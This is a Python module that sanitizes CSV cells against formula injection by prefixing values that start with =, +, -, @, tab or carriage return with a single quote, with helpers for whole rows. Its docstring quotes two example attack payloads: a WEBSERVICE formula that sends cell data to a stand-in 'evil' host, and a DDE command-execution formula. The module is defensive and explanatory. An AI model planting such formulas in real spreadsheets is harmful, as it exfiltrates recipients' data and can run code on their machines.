"""
CSV formula-injection sanitization.

When a CSV exported by this service is opened in Excel / LibreOffice /
Google Sheets, any cell whose text begins with ``=``, ``+``, ``-``, ``@``,
``\\t``, or ``\\r`` is interpreted as a formula and executed. An attacker
who can influence any free-text field that lands in a CSV cell can plant
``=WEBSERVICE("http://evil/?x="&A1)`` to exfiltrate neighboring data, or
``=cmd|' /C calc'!A0`` DDE payloads to achieve RCE on older Excel
versions. The attack lands at the *recipient's* workstation (FDA
auditor, customer operations team, recall simulator) — a party the
product specifically exists to serve — so reputational impact is
disproportionate to technical difficulty.

This module provides a single helper, :func:`sanitize_cell`, that
prefixes any dangerous value with a literal single quote. Excel treats
a leading ``'`` as a literal-text marker and never renders it to the
user.

Rules of use:

* Apply :func:`sanitize_cell` at the point of CSV writing — not earlier.
  Data in transit and at rest keeps its original shape.
* Prefer :func:`csv.writer` with ``quoting=csv.QUOTE_ALL`` as a second
  line of defense for values containing newlines, quotes, or commas.
* For free-text header/metadata rows (which bypass ``DictWriter``
  field maps), sanitize every cell value explicitly.

Related issue: #1081 (ingestion-side FDA / recall CSV exports), #1272
(compliance-service ``fsma_spreadsheet.py`` codepath).
"""

from __future__ import annotations

# Excel/LibreOffice/Sheets treat these as formula indicators.
# \t and \r bypass quoting heuristics in some clients.
_DANGEROUS_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def sanitize_cell(value: object) -> str:
    """Neutralize CSV formula-injection by prefixing dangerous values.

    Converts ``value`` to a string and prepends a literal single quote
    ``'`` when the string starts with any of the standard formula
    prefixes. Excel treats the leading ``'`` as a literal-text marker
    and does not render it.

    Parameters
    ----------
    value:
        Arbitrary Python object. ``None`` is rendered as an empty
        string; everything else is ``str()``-coerced.

    Returns
    -------
    str
        Safe cell content.

    Notes
    -----
    This preserves round-tripability for values that are *not* dangerous
    — a product description ``"Romaine Hearts"`` returns unchanged.
    Only values starting with ``=``, ``+``, ``-``, ``@``, ``\\t``, or
    ``\\r`` get a ``'`` prepended.
    """
    if value is None:
        return ""
    s = str(value)
    if s and s[0] in _DANGEROUS_PREFIXES:
        return "'" + s
    return s


def sanitize_row(row: dict[str, object]) -> dict[str, str]:
    """Apply :func:`sanitize_cell` to every value in a dict-style row."""
    return {k: sanitize_cell(v) for k, v in row.items()}


def sanitize_sequence(seq) -> list[str]:
    """Apply :func:`sanitize_cell` to every value in a list/tuple row."""
    return [sanitize_cell(v) for v in seq]


__all__ = ["sanitize_cell", "sanitize_row", "sanitize_sequence"]
